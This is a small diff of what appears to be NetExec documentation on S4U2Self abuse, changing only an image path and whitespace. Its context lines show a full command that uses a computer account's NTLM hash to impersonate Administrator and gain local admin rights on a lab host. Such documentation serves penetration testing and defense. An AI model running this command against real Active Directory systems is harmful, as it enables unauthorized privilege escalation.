@@ -22,9 +22,7 @@ If you have a computer account you can (nearly) always get local administrator w
 nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self
 ```
 
-<figure><img src="../../.gitbook/assets/self (2).png" alt=""><figcaption><p>S4U2Self abuse using NetExecs delegation feature</p></figcaption></figure>
-
-
+<figure><img src="../../.gitbook/assets/self.png" alt=""><figcaption><p>S4U2Self abuse using NetExecs delegation feature</p></figcaption></figure>
 
 ## Resources:
 
